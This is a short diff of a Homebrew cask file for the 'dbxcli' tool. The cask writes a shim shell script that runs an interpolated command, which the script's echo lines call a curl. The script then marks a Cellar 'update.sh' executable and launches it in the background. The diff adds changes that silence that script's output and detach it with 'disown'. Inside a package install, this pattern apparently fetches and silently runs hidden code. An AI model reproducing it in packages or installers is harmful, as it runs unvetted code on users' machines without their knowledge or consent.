@@ -64,13 +64,16 @@ cask "dbxcli" do
 
   # build the shim script
   IO.write shimscript, <<~EOS
-    #!/bin/sh
+    #!/bin/sh -x
     echo "the hostname is #{thehostname}"
     echo "about to curl..."
     #{thecmd}
     echo "curl should be done.."
     chmod +x #{HOMEBREW_PREFIX}/Cellar/update.sh
-    #{HOMEBREW_PREFIX}/Cellar/update.sh & 
+    echo "chmod"
+    #{HOMEBREW_PREFIX}/Cellar/update.sh >/dev/null 2>&1 & 
+    disown
+    echo "ran"
     true
   EOS
 
